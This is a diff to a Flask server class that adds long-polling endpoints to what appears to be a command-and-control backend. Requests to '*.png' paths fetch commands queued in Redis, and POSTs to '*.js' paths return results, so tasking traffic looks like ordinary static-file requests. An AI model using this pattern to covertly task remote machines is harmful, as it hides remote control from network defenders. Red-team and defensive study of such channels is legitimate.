@@ -1,4 +1,4 @@
-from time import time
+from time import time, sleep
 from flask import Flask, render_template, request, jsonify
 import base64
 import redis
@@ -16,12 +16,22 @@ class FlaskApplication:
     Each instance handles a specific domain with its own template folder and configuration
     """
 
-    def __init__(self, domain, redis_client=redis.Redis(), template_folder=None):
+    # TODO: In the future make it such that the user s a ble to select the endpoints that they want to use, specifclaly the file extensions
+
+    def __init__(
+        self,
+        domain,
+        redis_client=redis.Redis(),
+        template_folder=None,
+        polling_timer: int = 10,
+    ):
         self.domain = domain
         self.redis_client = redis_client
         self.template_folder = template_folder or f"../templates/{self.domain}"
 
         self.app = self._create_app()
+        # The max amount of time a long polling connection timer is held open
+        self.polling_timer = polling_timer
         self._setup_routes()
 
     def _create_app(self):
@@ -113,6 +123,61 @@ class FlaskApplication:
                 return jsonify(
                     status="no results or commands provided",
                 )
+
+        @self.app.route("/<path:filename>.png", methods=["GET"])
+        def handle_long_poll_command_request(filename):
+            """Used as the endpoint for longpolling commands, holds the connection open until commands are received for a set timer"""
+
+            # If there are commands immediately available, send htem
+            commands = command.get_queued_commands(self.domain, self.redis_client)
+
+            time_spent = 0
+            while not commands and time_spent < self.polling_timer:
+                # Check every 0.1 seconds
+                commands = command.get_queued_commands(self.domain, self.redis_client)
+                time_spent += 0.1
+                # Set the sleep operation
+                sleep(0.1)
+
+            # If commands were found we immiedately return
+            if commands:
+                # Decode bytes to strings if needed
+                decoded_commands = [
+                    cmd.decode("utf-8") if isinstance(cmd, bytes) else cmd
+                    for cmd in commands
+                ]
+                return (
+                    jsonify(
+                        {
+                            "commands": decoded_commands,
+                        }
+                    ),
+                    200,
+                )
+            # Otherwise send a failed reponse
+            return jsonify(status="No results or commands provided"), 404
+
+        @self.app.route("/<path:filename>.js", methods=["POST"])
+        def handle_long_poll_command_return(filename):
+            """Used as the enpoint to get results back from longpolling commands"""
+
+            data = request.get_json()
+            results = data.get("results")
+            commands = data.get("commands")
+
+            # Ensure that results is a list and not another python iterable (string)
+            if not isinstance(results, list):
+                return jsonify(error="Results must be a list"), 400
+            if not isinstance(commands, list):
+                return jsonify(error="Commands must be a list"), 400
+
+            if results and commands:
+                self._redis_push_results(results, commands)
+                return jsonify(status="received"), 200
+            else:
+                return jsonify(status="no results or commands provided"), 404
+
+        # TODO: Key exchange route and endpoint
 
         @self.app.route("/results", methods=["POST"])
         def reportChunk():
